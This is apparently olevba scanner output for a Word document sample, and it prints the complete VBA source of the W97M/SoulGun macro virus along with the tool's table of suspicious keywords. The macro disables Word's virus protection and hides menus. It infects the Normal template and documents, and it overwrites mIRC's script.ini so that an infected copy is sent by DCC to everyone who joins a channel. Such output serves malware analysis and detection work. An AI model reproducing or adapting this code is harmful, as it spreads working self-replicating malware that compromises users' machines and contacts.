olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.dm-dad612abc3f89cc7d8fa5ce9dcb144c4959daeba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.dm-dad612abc3f89cc7d8fa5ce9dcb144c4959daeba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
' AMc:\programme\microsoft office\office\startup25.12.99 21:24:10025.12.99 21:24:10
' AMc:\programme\microsoft office\office\startup25.12.99 21:24:10025.12.99 21:24:10
' AMc:\programme\microsoft office\office\startup25.12.99 21:24:10025.12.99 21:24:10
' AMc:\programme\microsoft office\office\startup25.12.99 21:24:10025.12.99 21:24:10
' AMc:\programme\microsoft office\office\startup25.12.99 21:24:10025.12.99 21:24:10
' AMc:\programme\microsoft office\office\startup25.12.99 21:24:10025.12.99 21:24:10
' AMc:\programme\microsoft office\office\startup25.12.99 21:24:10025.12.99 21:24:10
On Error Resume Next
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With

CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
Application.ScreenUpdating = False
Options.SendMailAttach = True

nomcnt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
actcnt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If nomcnt >= 12 Then nominf = True Else nominf = False
If actcnt >= 12 Then actinf = True Else actinf = False

ActiveDocument.VBProject.VBComponents.Item(1).Name = NormalTemplate.VBProject.VBComponents.Item(1).Name

If actinf = True Then ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\chile.sys"
If nominf = False Then Set host = NormalTemplate.VBProject.VBComponents.Item(1)
If actinf = False Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
If nominf = False And System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Installed" Then
MsgBox "sOUlGun has returned"
MsgBox "As far from god as heaven is wide As far from god as angels can fly", vbExclamation, "W97M/SOULGUN"
Application.Quit

If (Day(Now)) = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Reprieved"
End If

If nominf = False Then System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Installed"
host.codemodule.AddFromFile ("c:\chile.sys")

With host.codemodule
For x = 1 To 4
.deletelines 1
Next x
End With

If nominf = False Then host.codemodule.ReplaceLine 1, "Sub AutoClose()"
If actinf = False Then host.codemodule.ReplaceLine 1, "Sub AutoOpen()"
If actinf = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
If nominf = False Then NormalTemplate.Save
If nominf = False And System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\main", "SoulGun") = "Installed" Then

ActiveDocument.SaveAs FileName:="c:\Pornpass.doc", fileformat:=wdFormatDocument, AddToRecentFiles:=False, ReadOnlyRecommended:=False
On Error GoTo mircnothere
Kill "c:\mirc\script.ini"
Open "c:\mirc\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\Pornpass.doc }"
Print #1, "n1=on 1:CONNECT: {"
Print #1, "n2=  /join #vir"
Print #1, "n3=  /msg #vir As far from g0d as angels can fly....Another W97m/Soulgun Infected user"
Close 1
End If
mircnothere:
With host.codemodule
For x = 2 To 8
.ReplaceLine x, "' " & Application.UserInitials & Application.StartupPath & Now & Application.WindowState & Now
Next x
End With
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

